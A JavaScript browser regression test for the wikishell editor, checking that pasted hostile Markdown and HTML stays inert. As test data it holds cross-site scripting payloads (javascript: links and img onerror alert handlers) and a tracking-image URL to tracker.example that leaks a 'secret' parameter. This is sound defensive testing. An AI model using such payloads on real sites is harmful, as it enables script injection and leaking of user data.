// Hostile pastes into the editor (Audy's M-1; his proof, wiki-shell 00f1e23,
// made a regression test): Markdown and HTML, with javascript: links, an
// <img onerror> and remote images. Nothing is fetched before Load, nothing
// runs, no link draws or saves a script address.
//
//   node ui/e2e/paste.mjs <wikishell binary> <browser install>
import { spawn } from "node:child_process";
import fs from "node:fs";
import net from "node:net";
import os from "node:os";
import path from "node:path";

const [bin, browserDir] = process.argv.slice(2).map((p) => p && path.resolve(p));
if (!bin || !browserDir) {
  console.error("usage: node ui/e2e/paste.mjs <wikishell binary> <browser install>");
  process.exit(2);
}
const { launch, open } = await import(path.join(browserDir, "browser.mjs"));
const P = fs.mkdtempSync(path.join(os.tmpdir(), "wikishell-paste-"));
fs.writeFileSync(path.join(P, "wiki.toml"), 'spec = "0.1"\n');
const port = await new Promise((ok) => {
  const s = net.createServer().listen(0, "127.0.0.1", () => {
    const { port } = s.address();
    s.close(() => ok(port));
  });
});
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
let failed = 0;
const check = (ok, what) => {
  console.log(`${ok ? "ok  " : "FAIL"} ${what}`);
  if (!ok) failed++;
};

const cases = {
  "a Markdown image": { "text/plain": "![beacon](https://tracker.example/md.png?d=secret)" },
  "Markdown links": {
    "text/plain": "[a](javascript:alert(1)) [b](JaVaScRiPt:alert(2)) <img src=https://tracker.example/raw.png onerror=alert(3)>",
  },
  "HTML": {
    "text/html": '<p><a href="javascript:alert(4)">x</a> <img src="https://tracker.example/html.png" onerror="alert(5)"></p>',
    "text/plain": "x",
  },
};
const srv = spawn(bin, [P, "--port", String(port)], { stdio: "ignore" });
const browser = await launch();
try {
  await wait(1000);
  for (const [name, data] of Object.entries(cases)) {
    fs.writeFileSync(path.join(P, "index.md"), "---\ntitle: Home\n---\n# Home\n\nStart here.\n");
    const shot = await open(browser, { viewport: { width: 1200, height: 900 } });
    await shot.context.addInitScript(() => {
      window.__csp = [];
      document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
    });
    const p = shot.page;
    const dialogs = [];
    p.on("dialog", (d) => {
      dialogs.push(d.message());
      d.dismiss();
    });
    await p.goto(`http://127.0.0.1:${port}/wiki/index.md`);
    await p.locator("article .ProseMirror").waitFor({ state: "visible", timeout: 20000 });
    await p.locator("article .ProseMirror > p").last().click();
    await p.keyboard.press("End");
    await p.keyboard.press("Enter");
    await p.evaluate((data) => {
      const dt = new DataTransfer();
      for (const [t, v] of Object.entries(data)) dt.setData(t, v);
      document
        .querySelector("article .ProseMirror")
        .dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
    }, data);
    await wait(2500);
    const r = await p.evaluate(() => ({
      hrefs: [...document.querySelectorAll("article a[href]")].map((a) => a.getAttribute("href")).filter((h) => !/^#|^\/wiki/.test(h)),
      srcs: [...document.querySelectorAll("article [src]")].map((e) => e.getAttribute("src")),
      csp: window.__csp,
    }));
    const saved = fs.readFileSync(path.join(P, "index.md"), "utf8");
    check(shot.refused.size === 0, `${name}: nothing fetched before Load`);
    check(dialogs.length === 0, `${name}: nothing runs`);
    check(!r.hrefs.some((h) => /script/i.test(h)) && !r.srcs.some((s) => /tracker/.test(s)), `${name}: no script link, no remote src drawn`);
    check(!/javascript:/i.test(saved), `${name}: no script address saved`);
    check(r.csp.length === 0, `${name}: no CSP violation`);
    await shot.context.close();
  }
} finally {
  await browser.close();
  srv.kill();
  fs.rmSync(P, { recursive: true, force: true });
}
console.log(failed ? `${failed} failed` : "hostile pastes stay inert");
process.exit(failed ? 1 : 0);
